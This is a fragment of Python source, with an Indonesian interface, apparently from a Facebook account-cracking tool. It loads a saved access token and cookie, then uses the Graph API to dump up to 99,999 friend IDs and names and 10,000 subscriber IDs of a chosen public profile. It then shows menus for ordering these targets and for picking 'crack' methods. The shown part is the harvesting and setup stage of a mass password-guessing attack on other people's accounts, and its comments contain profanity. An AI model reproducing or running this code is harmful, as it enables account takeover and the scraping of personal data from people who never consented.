def cracked_public():
	print("")
	jalan(f"╰-> Target Harus Publik Dan Memiliki Banyak Teman")
	jalan(f"╰-> Ketik {H}Me {P}Untuk Crack Pertemanan Pribadi")
	print("")
	put = input("Target Id Publik : ")
	print("")
	try:
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		coa = requests.get('https://graph.facebook.com/%s?access_token=%s'%(put,token),cookies=coki)
		el = json.loads(coa.text)
		try:lk = el["name"]
		except (KeyError,IOError):
			lk = M+"-"+P
		#tukangrecodekontol
		token = open('token.txt','r').read()
		cookie = open('cookie.txt','r').read()
		coki = {"cookie":cookie}
		cyna = requests.get('https://graph.facebook.com/%s?fields=friends.limit(99999)&access_token=%s'%(put,token),cookies=coki).json()
		for fuck in cyna['friends']['data']:
			try:id.append(fuck['id']+'|'+fuck['name'])
			except:continue
		cini = requests.get('https://graph.facebook.com/%s?fields=subscribers.limit(10000)&access_token=%s'%(put,token),cookies=coki).json()
		for fak in cini['subscribers']['data']:
			try:id3.append(fak['id']+'|'+fak['name'])
			except:continue
		#tukangrecodekontol
		jalan(f"Nama Target      : {lk}\nTotal Teman      : {len(id)}")
		settingers()
	except requests.exceptions.ConnectionError:
		jalan(garis+" koneksi internet bermasalah ")
		exit()
	except (KeyError,IOError):
		jalan("gagal dump id akun memiliki pertemanan tidak publik") 
		os.system("clear")
		menu()
	
def settingers():
	print("")
	jalan(f"╰-> 1.Crack Akun Baru ({H}Sangat Rekomendasi{P})\n╰-> 2.Crack Akun Lama ({M}Tidak Di Rekomendasi{P})\n╰-> 3.Crack Akun Random ({B}Rekomendasi{P})")
	print("")
	GlukTzy = input("╰--> Pilih : ")
	if GlukTzy in ['2','02']:
		for bacot in id:
			id2.append(bacot)
	elif GlukTzy in ['1','01']:
		for bacot in id:
			id2.insert(0,bacot)
	elif GlukTzy in ['3','03']:
		for bacot in id:
			xx = random.randint(0,len(id2))
			id2.insert(xx,bacot)
	elif GlukTzy in ['5','05']:
		for kont in id3:
			id4.append(kont)
	elif GlukTzy in ['4','04']:
		for kont in id3:
			id4.insert(0,kont)
	elif GlukTzy in ['6','06']:
		for kont in id3:
			xx = random.randint(0,len(id4))
			id4.insert(xx,kont)
	else:
		jalan(garis+" isi yang benar")
		settingers()
	crack_public_pilihan()

def crack_public_pilihan():
	print("")
	jalan(f"1.Methode Mobile ({B}slowed{P})\n2.methode m.basic ({K}fast{P})\n3.methode free ({M}not recommended{P})\n4.methode mobile vers 2 ({B}slowed{P})\n5.methode b.api ({M}very fast{P})\n6.methode mobile ({U}free fire{P})\n7.methode mobile vers 3 ({B}Good Methode{P})")
